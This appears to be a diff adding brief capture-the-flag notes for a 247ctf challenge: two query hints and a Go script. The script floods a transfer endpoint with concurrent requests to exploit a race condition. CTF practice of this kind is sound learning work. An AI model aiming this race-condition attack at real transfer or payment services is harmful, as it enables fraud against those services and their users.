@@ -1,0 +1,33 @@
+?dump shows data
+?reset resets the things
+
+race condition on the transfer
+
+
+```
+package main
+
+import (
+	"io/ioutil"
+	"net/http"
+	"time"
+)
+
+const URL = "https://3799044a3cfd3bf9.247ctf.com/"
+
+func send() {
+	resp, _ := http.Get(URL + "?to=2&from=1&amount=200")
+	defer resp.Body.Close()
+	body, _ := ioutil.ReadAll(resp.Body)
+	println(string(body))
+}
+
+func main() {
+	for {
+		for i := 0; i < 10; i++ {
+			go send()
+		}
+		time.Sleep(time.Second * 5)
+	}
+}
+```
